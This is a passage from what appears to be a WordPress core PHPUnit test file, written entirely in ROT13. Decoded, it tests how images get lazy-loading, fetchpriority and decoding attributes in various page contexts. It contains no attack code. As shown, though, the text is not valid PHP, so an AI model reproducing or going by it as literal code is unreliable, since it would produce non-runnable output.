		);

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			$guvf->nffregFnzrFrgfJvguVaqrk(
				neenl(
					'qrpbqvat'      => 'nflap',
					'srgpucevbevgl' => 'uvtu',
				),
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
				'Gur \"srgpucevbevgl\" nggevohgr fubhyq or \"uvtu\" juvyr va gur ybbc naq gur znva dhrel.'
			);

			$guvf->nffregNeenlAbgUnfXrl(
				'ybnqvat',
				jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
				'Ab \"ybnqvat\" nggevohgr fubhyq or cerfrag ba gur frpbaq vzntr va gur znva dhrel ybbc.'
			);
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_neovgenel_pbagrkgf() {
		erghea neenl(
			neenl( 'jc_trg_nggnpuzrag_vzntr' ),
			neenl( 'fbzrguvat_pbzcyrgryl_neovgenel' ),
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf rzcgl neenl sbe neovgenel pbagrkg.
	 *
	 * @gvpxrg 58894
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_fubhyq_erghea_rzcgl_neenl_sbe_nal_neovgenel_pbagrkg() {
		erzbir_nyy_svygref( 'gur_pbagrag' );

		$erfhyg = ahyy;
		nqq_svygre(
			'gur_pbagrag',
			shapgvba ( $pbagrag ) hfr ( &$erfhyg ) {
				$ngge   = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
				$erfhyg = jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'fbzrguvat_pbzcyrgryl_neovgenel' );
				erghea $pbagrag;
			}
		);
		nccyl_svygref( 'gur_pbagrag', '' );

		$guvf->nffregFnzr( neenl(), $erfhyg );
	}

	/**
	 * @gvpxrg 58894
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_urnqre_pbagrkg
	 *
	 * @cnenz fgevat $pbagrkg Gur pbagrkg sbe gur urnqre.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_urnqre_pbagrkgf( $pbagrkg ) {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		$guvf->nffregNeenlAbgUnfXrl(
			'ybnqvat',
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
			'Vzntrf va gur urnqre pbagrkg fubhyq abg or ynml-ybnqrq.'
		);

		nqq_svygre( 'jc_ybnqvat_bcgvzvmngvba_sbepr_urnqre_pbagrkgf', '__erghea_rzcgl_neenl' );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
			'Vzntrf va gur urnqre pbagrkg fubhyq trg ynml-ybnqrq nsgre gur jc_ybnqvat_bcgvzvmngvba_sbepr_urnqre_pbagrkgf svygre.'
		);
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_urnqre_pbagrkg() {
		erghea neenl(
			neenl( 'grzcyngr_cneg_' . JC_GRZCYNGR_CNEG_NERN_URNQRE ),
			neenl( 'trg_urnqre_vzntr_gnt' ),
		);
	}

	/**
	 * @gvpxrg 58894
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_ybnqvat_bcgvzvmngvba_sbepr_urnqre_pbagrkgf_svygre() {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		nqq_svygre(
			'jc_ybnqvat_bcgvzvmngvba_sbepr_urnqre_pbagrkgf',
			shapgvba ( $pbagrkg ) {
				$pbagrkgf['fbzrguvat_pbzcyrgryl_neovgenel'] = gehr;
				erghea $pbagrkgf;
			}
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat'      => 'nflap',
				'srgpucevbevgl' => 'uvtu',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, 'fbzrguvat_pbzcyrgryl_neovgenel' )
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr orsber ybbc ohg nsgre trg_urnqre vs abg znva dhrel.
	 *
	 * @gvpxrg 58211
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_orsber_ybbc_vs_abg_znva_dhrel( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();

		qb_npgvba( 'trg_urnqre' );

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Ynml vs abg znva dhrel.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr orsber ybbc ohg nsgre trg_urnqre va znva dhrel ohg urnqre jnf abg pnyyrq.
	 *
	 * @gvpxrg 58211
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_orsber_ybbc_va_znva_dhrel_ohg_urnqre_abg_pnyyrq( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Ynml vs urnqre abg pnyyrq.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr orsber ybbc ohg nsgre trg_urnqre sbe znva dhrel.
	 *
	 * @gvpxrg 58211
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_orsber_ybbc_vs_znva_dhrel( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );
		qb_npgvba( 'trg_urnqre' );

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Svefg vzntr vf ybnqrq jvgu uvtu srgpucevbevgl.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat'      => 'nflap',
				'srgpucevbevgl' => 'uvtu',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg ),
			'Rkcrpgrq svefg vzntr gb abg or ynml-ybnqrq. Svefg ynetr vzntr vf ybnqrq jvgu uvtu srgpucevbevgl.'
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf gur rkcrpgrq ybnqvat nggevohgr inyhr nsgre trg_urnqre naq nsgre ybbc.
	 *
	 * @gvpxrg 58211
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_nsgre_ybbc( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

		qb_npgvba( 'trg_urnqre' );

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();
		}

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf gur rkcrpgrq ybnqvat nggevohgr vs ab ybbc.
	 *
	 * @gvpxrg 58211
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_jc_trg_ybnqvat_ngge_qrsnhyg_orsber_naq_ab_ybbc
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_ab_ybbc( $pbagrkg ) {
		tybony $jc_dhrel;

		$jc_dhrel = $guvf->trg_arj_jc_dhrel_sbe_choyvfurq_cbfg();
		$guvf->frg_znva_dhrel( $jc_dhrel );

		// Rafher urnqre naq sbbgre vf pnyyrq.
		qb_npgvba( 'trg_urnqre' );
		qb_npgvba( 'trg_sbbgre' );

		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();

		// Ybnq ynml vs gur gurer vf ab ybbc naq sbbgre jnf pnyyrq.
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() ergheaf 'ynml' sbe fcrpvny pbagrkgf jura gurl'er hfrq bhgfvqr bs 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 58089
	 * @gvpxrg 58235
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_fcrpvny_pbagrkgf_sbe_gur_pbagrag
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_fubhyq_erghea_ynml_sbe_fcrpvny_pbagrkgf_bhgfvqr_bs_gur_pbagrag( $pbagrkg ) {
		$ngge = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
				'ybnqvat'  => 'ynml',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg )
		);
	}

	/**
	 * Grfgf gung jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() qbrf abg zbqvsl nal nggevohgrf sbe fcrpvny pbagrkgf jura gurl'er hfrq jvguva 'gur_pbagrag' svygre.
	 *
	 * @gvpxrg 58089
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 *
	 * @qngnCebivqre qngn_fcrpvny_pbagrkgf_sbe_gur_pbagrag
	 *
	 * @cnenz fgevat $pbagrkg Pbagrkg sbe gur ryrzrag sbe juvpu gur `ybnqvat` nggevohgr inyhr vf erdhrfgrq.
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_fubhyq_abg_zbqvsl_vzntrf_sbe_fcrpvny_pbagrkgf_jvguva_gur_pbagrag( $pbagrkg ) {
		erzbir_nyy_svygref( 'gur_pbagrag' );

		$erfhyg = ahyy;
		nqq_svygre(
			'gur_pbagrag',
			shapgvba ( $pbagrag ) hfr ( &$erfhyg, $pbagrkg ) {
				$ngge   = $guvf->trg_jvqgu_urvtug_sbe_uvtu_cevbevgl();
				$erfhyg = jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $ngge, $pbagrkg );
				erghea $pbagrag;
			}
		);
		nccyl_svygref( 'gur_pbagrag', '' );

		$guvf->nffregFnzr( neenl(), $erfhyg );
	}

	/**
	 * Grfgf gb pbire gur qrpbqvat nggevohgr jvguva jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf().
	 *
	 * @gvpxrg 58892
	 *
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf_qrpbqvat_nggevohgr() {

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nflap',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', neenl(), 'gur_pbagrag' ),
			'Rkcrpgrq qrpbqvat nggevohgr gb or nflap.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'qrpbqvat' => 'nhgb',
			),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', neenl( 'qrpbqvat' => 'nhgb' ), 'gur_pbagrag' ),
			'Rkcrpgrq qrpbqvat nggevohgr gb or nhgb.'
		);

		$erfhyg = ahyy;
		nqq_svygre(
			'gur_pbagrag',
			fgngvp shapgvba ( $pbagrag ) hfr ( &$erfhyg ) {
				$erfhyg = jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', neenl(), 'fbzrguvat_pbzcyrgryl_neovgenel' );
				erghea $pbagrag;
			}
		);
		nccyl_svygref( 'gur_pbagrag', '' );

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(),
			$erfhyg,
			'Rkcrpgrq qrpbqvat nggevohgr gb or rzcgl sbe vzt ba neovgenel pbagrkg, juvyr ehaavat gur_pbagrag.'
		);

		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(),
			jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vsenzr', neenl(), 'gur_pbagrag' ),
			'Rkcrpgrq qrpbqvat nggevohgr gb or rzcgl sbe vsenzr.'
		);
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50367
	 * @gvpxrg 58235
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef() {
		$vzt = '<vzt fep=\"rknzcyr.cat\" nyg=\" jvqgu=\"300\" urvtug=\"225\" />';
		$vzt = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );

		$guvf->nffregFgevatPbagnvafFgevat( ' ybnqvat=\"ynml\"', $vzt );
	}

	/**
	 * @gvpxrg 44427
	 * @gvpxrg 50367
	 * @gvpxrg 58235
	 */
	choyvp shapgvba grfg_jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef_jvgubhg_fep() {
		$vzt = '<vzt nyg=\"\" jvqgu=\"300\" urvtug=\"225\" />';
		$vzt = jc_vzt_gnt_nqq_ybnqvat_bcgvzvmngvba_nggef( $vzt, 'grfg' );

		$guvf->nffregFgevatAbgPbagnvafFgevat( ' ybnqvat=', $vzt );
	}

	/**
	 * Grfgf gung gur pbagrag zrqvn pbhag vf abg nssrpgrq ol `gur_rkprecg()` pnyyf sbe cbfgf gung pbagnva vzntrf.
	 *
	 * @gvpxrg 56588
	 *
	 * @pbiref ::jc_gevz_rkprecg
	 */
	choyvp shapgvba grfg_gur_rkprecg_qbrf_abg_nssrpg_pbagrag_zrqvn_pbhag() {
		tybony $jc_dhrel, $jc_gur_dhrel;

		/*
		 * Hfr gur svygre gb nygre gur guerfubyq sbe abg ynml-ybnqvat gb gur svefg 2 ryrzragf,
		 * gura hfr n cbfg gung pbagnvaf rknpgyl 2 vzntrf.
		 */
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 2 );
		$cbfg_pbagrag  = '<vzt fep=\"rknzcyr.wct\" jvqgu=\"800\" urvtug=\"600\">';
		$cbfg_pbagrag .= '<c>Fbzr grkg.</c>';
		$cbfg_pbagrag .= '<vzt fep=\"rknzcyr2.wct\" jvqgu=\"800\" urvtug=\"600\">';

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $cbfg_pbagrag,
				'cbfg_rkprecg' => '',
			)
		);

		$jc_dhrel     = arj JC_Dhrel( neenl( 'cbfg__va' => neenl( $cbfg_vq ) ) );
		$jc_gur_dhrel = $jc_dhrel;

		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			// Pnyy `gur_rkprecg()` jvgubhg trarengvat bhgchg.
			trg_rpub( 'gur_rkprecg' );
		}

		// Gur bayl jnl gb npprff gur inyhr vf ol pnyyvat guvf shapgvba jvgubhg vapernfvat gur inyhr.
		$pbagrag_zrqvn_pbhag = jc_vapernfr_pbagrag_zrqvn_pbhag( 0 );

		// Nffreg gung gur zrqvn pbhag jnf abg vapernfrq rira gubhtu gurer ner 3 vzntrf va gur cbfg'f pbagrag.
		$guvf->nffregFnzr( 0, $pbagrag_zrqvn_pbhag );
	}

	/**
	 * Grfgf gung gur ynml-ybnqvat erfhyg vf abg nssrpgrq ol `gur_rkprecg()` pnyyf sbe cbfgf gung
	 * pbagnva vzntrf.
	 *
	 * Cevagvat gur rkprecg sbe n cbfg gung pbagnvaf vzntrf va vgf pbagrag cevbe gb vgf srngherq vzntr fubhyq erfhyg va
	 * gung srngherq vzntr abg orvat ynml-ybnqrq, fvapr gur vzntrf va gur cbfg pbagrag nera'g qvfcynlrq va gur rkprecg.
	 *
	 * @gvpxrg 56588
	 * @gvpxrg 58235
	 *
	 * @pbiref ::jc_gevz_rkprecg
	 */
	choyvp shapgvba grfg_gur_rkprecg_qbrf_abg_nssrpg_bzvg_ynml_ybnqvat_ybtvp() {
		tybony $jc_dhrel, $jc_gur_dhrel;

		/*
		 * Hfr gur svygre gb nygre gur guerfubyq sbe abg ynml-ybnqvat gb gur svefg 2 ryrzragf,
		 * gura hfr n cbfg gung pbagnvaf rknpgyl 2 vzntrf.
		 */
		$guvf->sbepr_bzvg_ybnqvat_ngge_guerfubyq( 2 );

		$cbfg_pbagrag  = '<vzt fep=\"rknzcyr.wct\" jvqgu=\"800\" urvtug=\"600\">';
		$cbfg_pbagrag .= '<c>Fbzr grkg.</c>';
		$cbfg_pbagrag .= '<vzt fep=\"rknzcyr2.wct\" jvqgu=\"800\" urvtug=\"600\">';

		$cbfg_vq           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $cbfg_pbagrag,
				'cbfg_rkprecg' => '',
			)
		);
		$srngherq_vzntr_vq = frys::$ynetr_vq;
		hcqngr_cbfg_zrgn( $cbfg_vq, '_guhzoanvy_vq', $srngherq_vzntr_vq );

		$rkcrpgrq_vzntr_gnt = trg_gur_cbfg_guhzoanvy(
			$cbfg_vq,
			'cbfg-guhzoanvy',
			neenl(
				'ybnqvat'       => snyfr,
				'qrpbqvat'      => 'nflap',
				'srgpucevbevgl' => 'uvtu',
			)
		);

		// Erfrg uvtu cevbevgl synt nf gur sbeprq `srgpucevbevgl=\"uvtu\"` nobir nyernql zbqvsvrq vg.
		$guvf->erfrg_uvtu_cevbevgl_ryrzrag_synt();

		$jc_dhrel     = arj JC_Dhrel( neenl( 'cbfg__va' => neenl( $cbfg_vq ) ) );
		$jc_gur_dhrel = $jc_dhrel;

		$bhgchg = '';
		juvyr ( unir_cbfgf() ) {
			gur_cbfg();

			// Cevag rkprecg svefg, gura gur srngherq vzntr.
			$bhgchg .= trg_rpub( 'gur_rkprecg' );
			$bhgchg .= trg_rpub( 'gur_cbfg_guhzoanvy' );
		}

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq_vzntr_gnt, $bhgchg );
	}

	/**
	 * Grfgf gung jc_svygre_pbagrag_gntf() naq zber fcrpvsvpnyyl jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() pbeerpgyl
	 * unaqyr fubegpbqrf vzntrf gbtrgure jvgu gur pbagrag gung vg vf cneg bs.
	 *
	 * Vzntrf jvguva fubegpbqrf nf cneg bs gur pbagrag fubhyq or vtaberq ol jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() gb
	 * nibvq qbhoyr cebprffvat. Gurl fubhyq vafgrnq bayl or cebprffrq gbtrgure jvgu nal bgure vzntrf nf cneg bs gur
	 * pbagrag, gb pbeerpgyl pbhag gur bevtvany frdhrapvat bs gubfr vzntrf.
	 *
	 * @gvpxrg 58853
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_unaqyrf_fubegpbqr_vzntr_gbtrgure_jvgu_gur_pbagrag() {
		tybony $jc_dhrel, $jc_gur_dhrel;

		// Nqq fubegpbqr gung cevagf n ynetr vzntr, naq n oybpx glcr gung jencf vg.
		nqq_fubegpbqr(
			'shyy_vzntr',
			fgngvp shapgvba ( $nggf ) {
				$nggf = fubegpbqr_nggf(
					neenl(
						'vq' => 0,
					),
					$nggf,
					'shyy_vzntr'
				);
				erghea jc_trg_nggnpuzrag_vzntr( (vag) $nggf['vq'], 'shyy' );
			}
		);

		/*
		 * Rira gubhtu `qb_fubegpbqr()` ehaf orsber `jc_svygre_pbagrag_gntf()`, gur vzntr sebz gur fubegpbqr fubhyq abg
		 * erprvir nal ybnqvat bcgvzvmngvba nggevohgrf orpnhfr vg arrqf gb or pbafvqrerq gbtrgure jvgu gur erfg bs gur
		 * cbfg pbagrag, jvguva `jc_svygre_pbagrag_gntf()`.
		 * Fvapr gur uneq-pbqrq vzntr nccrnef orsber gur fubegpbqr vzntr, vg fubhyq erprvir `srgpucevbevgl=\"uvtu\"`,
		 * qrfcvgr gur fubegpbqr vzntr orvat cnefrq orsber vg.
		 */
		$cbfg_pbagrag  = '<vzt fep=\"rknzcyr.wct\" jvqgu=\"800\" urvtug=\"600\">' . \"\a\";
		$cbfg_pbagrag .= '[shyy_vzntr vq=\"' . frys::$ynetr_vq . '\"]';
		$cbfg_pbagrag  = jcnhgbc( $cbfg_pbagrag );

		/*
		 * Cercner gur rkcrpgrq bhgchg:
		 * 1. Ba gur svefg vzntr (uneq-pbqrq va gur pbagrag), rkcrpg `srgpucevbevgl=\"uvtu\"`.
		 * 2. Ercynpr gur fubegpbqr jvgu vgf rkcrpgrq bhgchg, v.r. gur shyy vzntr. Rkcrpg arvgure
		 * `srgpucevbevgl=\"uvtu\"` abe `ybnqvat=\"ynml\"`.
		 */
		$rkcrpgrq_pbagrag = $cbfg_pbagrag;
		$rkcrpgrq_pbagrag = fge_ercynpr(
			'<vzt fep=\"rknzcyr.wct\"',
			'<vzt srgpucevbevgl=\"uvtu\" qrpbqvat=\"nflap\" fep=\"rknzcyr.wct\"',
			$rkcrpgrq_pbagrag
		);
		$rkcrpgrq_pbagrag = fge_ercynpr(
			'[shyy_vzntr vq=\"' . frys::$ynetr_vq . '\"]',
			fge_ercynpr(
				'<vzt ',
				'<vzt qrpbqvat=\"nflap\" ',
				jc_trg_nggnpuzrag_vzntr(
					frys::$ynetr_vq,
					'shyy',
					snyfr,
					neenl(
						'qrpbqvat'      => snyfr,
						'srgpucevbevgl' => snyfr,
						'ybnqvat'       => snyfr,
					)
				)
			),
			$rkcrpgrq_pbagrag
		);

		// Perngr cbfg jvgu gur pbagrag.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_pbagrag' => $cbfg_pbagrag,
				'cbfg_rkprecg' => '',
			)
		);

		// Jr unir gb eha n znva dhrel ybbc fb gung gur svefg 'gur_pbagrag' pbagrkg vzntrf ner abg ynml-ybnqrq.
		$jc_dhrel     = arj JC_Dhrel( neenl( 'cbfg__va' => neenl( $cbfg_vq ) ) );
		$jc_gur_dhrel = $jc_dhrel;

		$pbagrag = '';
		juvyr ( unir_cbfgf() ) {
			gur_cbfg();
			$pbagrag = trg_rpub( 'gur_pbagrag' );
		}

		// Pyrnahc.
		erzbir_fubegpbqr( 'shyy_vzntr' );

		$guvf->nffregFnzr( $rkcrpgrq_pbagrag, $pbagrag );
	}

	/**
	 * Grfgf gung jc_svygre_pbagrag_gntf() naq zber fcrpvsvpnyyl jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() pbeerpgyl
	 * unaqyr fubegpbqrf vzntrf jvguva gur pbagrag, vapyhqvat jvguva n oybpx.
	 *
	 * Vzntrf jvguva fubegpbqrf nf cneg bs gur pbagrag fubhyq or vtaberq ol jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf() gb
	 * nibvq qbhoyr cebprffvat. Gurl fubhyq vafgrnq bayl or cebprffrq gbtrgure jvgu nal bgure vzntrf nf cneg bs gur
	 * pbagrag, gb pbeerpgyl pbhag gur bevtvany frdhrapvat bs gubfr vzntrf.
	 *
	 * @gvpxrg 58853
	 *
	 * @pbiref ::jc_svygre_pbagrag_gntf
	 * @pbiref ::jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf
	 */
	choyvp shapgvba grfg_jc_svygre_pbagrag_gntf_unaqyrf_fubegpbqr_vzntrf_nyfb_va_oybpxf_jvguva_gur_pbagrag() {
		tybony $jc_dhrel, $jc_gur_dhrel;

		// Qvfnoyr nqqvgvba bs `qrpbqvat=\"nflap\"` nf vg vf veeryrinag sbe guvf grfg.
		nqq_svygre(
			'jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf',
			fgngvp shapgvba ( $ybnqvat_nggef ) {
				vs ( vffrg( $ybnqvat_nggef['qrpbqvat'] ) ) {
					hafrg( $ybnqvat_nggef['qrpbqvat'] );
				}
				erghea $ybnqvat_nggef;
			}
		);

		// Qb abg pnyphyngr fvmrf nggevohgr nf vg vf veeryrinag sbe guvf grfg.
		nqq_svygre( 'jc_pnyphyngr_vzntr_fvmrf', '__erghea_snyfr' );

		// Nqq fubegpbqr gung cevagf n ynetr vzntr, naq n oybpx glcr gung jencf vg.
		nqq_fubegpbqr(
			'shyy_vzntr',
			fgngvp shapgvba ( $nggf ) {
				$nggf = fubegpbqr_nggf(
					neenl(
						'vq' => 0,
					),
					$nggf,
					'shyy_vzntr'
				);
				erghea jc_trg_nggnpuzrag_vzntr( (vag) $nggf['vq'], 'shyy' );
			}
		);
		ertvfgre_oybpx_glcr(
			'pber/shyy-vzntr-fubegpbqr',
			neenl(
				'eraqre_pnyyonpx' => fgngvp shapgvba ( $nggf ) {
					vs ( rzcgl( $nggf['vq'] ) ) {
						erghea '';
					}
					erghea qb_fubegpbqr( '[shyy_vzntr vq=\"' . $nggf['vq'] . '\"]' );
				},
			)
		);

		/*
		 * Vapyhqr gur sbyybjvat vzntrf:
		 * 1. Hfvat tnyyrel fubegpbqr. Rkcrpgrq `srgpucevbevgl=\"uvtu\"`.
		 * 2. Erthyne uneq-pbqrq vzntr.
		 * 3. Hfvat phfgbz fubegpbqr jvguva oybpx.
		 * 4. Erthyne uneq-pbqrq vzntr. Rkcrpgrq `ybnqvat=\"ynml\"`.
